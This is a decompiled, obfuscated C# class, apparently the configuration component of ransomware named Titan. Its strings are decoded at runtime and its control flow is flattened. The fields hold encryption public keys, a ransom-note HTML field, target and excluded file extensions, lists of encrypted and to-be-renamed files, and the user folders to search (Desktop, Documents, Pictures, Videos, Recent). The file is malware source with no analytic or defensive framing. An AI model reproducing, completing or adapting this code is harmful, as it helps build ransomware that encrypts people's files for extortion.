using System;
using System.Collections.Generic;
using System.IO;

namespace Titan.Function;

internal class Data
{
	public static string Name = _003CModule_003E._9e15c4c7<string>((uint)(_003CModule_003E.a200837b("LTEwOTM5NjcyNQ==") + 1775374 - Math.Max(1775374, 887687)), 0 + int.Parse("1526119488"));

	public static string Version;

	public static string PCData;

	public static string UUID;

	public static string Logger;

	public static string PublicKey;

	public static string PCDataPublicKey;

	public static string HELPNOTE_HTML;

	public static List<FileInfo> Files;

	public static List<DirectoryInfo> searchDir;

	public static string extensions;

	public static List<string> goodExtensions;

	public static List<string> encryptedList;

	public static Dictionary<FileInfo, string> toRename;

	static Data()
	{
		//IL_003a: Expected O, but got I4
		//IL_011f: Expected O, but got I4
		//IL_01a8: Expected O, but got I4
		//IL_01f9: Expected O, but got I4
		//IL_0282: Expected O, but got I4
		//IL_043b: Expected O, but got I4
		while (true)
		{
			int num = -1746043576;
			while (true)
			{
				int num2;
				switch ((uint)(num2 = _003CModule_003E._2b5ce101(num)) % 15u)
				{
				case 3u:
					break;
				default:
					return;
				case 6u:
					goodExtensions = new List<string>();
					num = (num2 * -1081504310) ^ -2125234423;
					continue;
				case 7u:
					UUID = "";
					num = (num2 * -1644892918) ^ -1228363424;
					continue;
				case 2u:
					PCData = "";
					num = (num2 * -865526804) ^ 0x769774E1;
					continue;
				case 14u:
					Version = _003CModule_003E._6931997e<string>((uint)(_003CModule_003E.a200837b("NzYxODI4Mjg4") + Math.Min(1775374, 3550748) - 1775374), 0 + int.Parse("987079286"));
					num = (num2 * -609885787) ^ 0x7343977A;
					continue;
				case 0u:
					Files = new List<FileInfo>();
					num = (num2 * -186448756) ^ 0x277C0202;
					continue;
				case 11u:
					toRename = new Dictionary<FileInfo, string>();
					num = (num2 * -326174732) ^ -1480144190;
					continue;
				case 8u:
					Logger = _003CModule_003E._49b74782<string>((uint)(_003CModule_003E.a200837b("Mjk1ODczMzYz") + 1775374 - Math.Max(1775374, 887687)), 0 + int.Parse("389055020"));
					num = (num2 * 973999601) ^ 0x31D0750;
					continue;
				case 1u:
					extensions = _003CModule_003E._9e15c4c7<string>((uint)(_003CModule_003E.a200837b("LTEwOTQxMTY5Nw==") + 1775374 - Math.Min(1775374, 3550748)), 0 + int.Parse("167122705"));
					num = (num2 * -1962185580) ^ 0x5AD500FC;
					continue;
				case 5u:
					HELPNOTE_HTML = "";
					num = (num2 * 1864679006) ^ -2047006795;
					continue;
				case 9u:
					encryptedList = new List<string>();
					num = (num2 * 370267540) ^ -177964537;
					continue;
				case 4u:
					PublicKey = _003CModule_003E._31ec1b2a<string>((uint)(_003CModule_003E.a200837b("LTk3NTI0MTc3MA==") + 1775374 - Math.Min(1775374, 3550748)), 0 + int.Parse("341584421"));
					num = (num2 * -2010793370) ^ -87507568;
					continue;
				case 10u:
					searchDir = new List<DirectoryInfo>
					{
						_003CModule_003E.zz_005B_005DA(_003CModule_003E._00AF_00831_00995(Environment.SpecialFolder.CommonDesktopDirectory)),
						_003CModule_003E.zz_005B_005DA(_003CModule_003E._00AF_00831_00995(Environment.SpecialFolder.CommonDocuments)),
						_003CModule_003E.zz_005B_005DA(_003CModule_003E._00AF_00831_00995(Environment.SpecialFolder.CommonMusic)),
						_003CModule_003E.zz_005B_005DA(_003CModule_003E._00AF_00831_00995(Environment.SpecialFolder.Desktop)),
						_003CModule_003E.zz_005B_005DA(_003CModule_003E._00AF_00831_00995(Environment.SpecialFolder.DesktopDirectory)),
						_003CModule_003E.zz_005B_005DA(_003CModule_003E._00AF_00831_00995(Environment.SpecialFolder.CommonPictures)),
						_003CModule_003E.zz_005B_005DA(_003CModule_003E._00AF_00831_00995(Environment.SpecialFolder.Personal)),
						_003CModule_003E.zz_005B_005DA(_003CModule_003E._00AF_00831_00995(Environment.SpecialFolder.MyMusic)),
						_003CModule_003E.zz_005B_005DA(_003CModule_003E._00AF_00831_00995(Environment.SpecialFolder.MyPictures)),
						_003CModule_003E.zz_005B_005DA(_003CModule_003E._00AF_00831_00995(Environment.SpecialFolder.MyVideos)),
						_003CModule_003E.zz_005B_005DA(_003CModule_003E._00AF_00831_00995(Environment.SpecialFolder.Personal)),
						_003CModule_003E.zz_005B_005DA(_003CModule_003E._00AF_00831_00995(Environment.SpecialFolder.Recent))
					};
					num = (num2 * -1680482763) ^ -800621635;
					continue;
				case 13u:
					PCDataPublicKey = _003CModule_003E._49b74782<string>((uint)(_003CModule_003E.a200837b("Mjk1ODcyOTQ1") + Math.Min(1775374, 3550748) - 1775374), 0 + int.Parse("1748945897"));
					num = (num2 * 309406494) ^ 0xBF4C8DC;
					continue;
				case 12u:
					return;
				}
				break;
			}
		}
	}
}
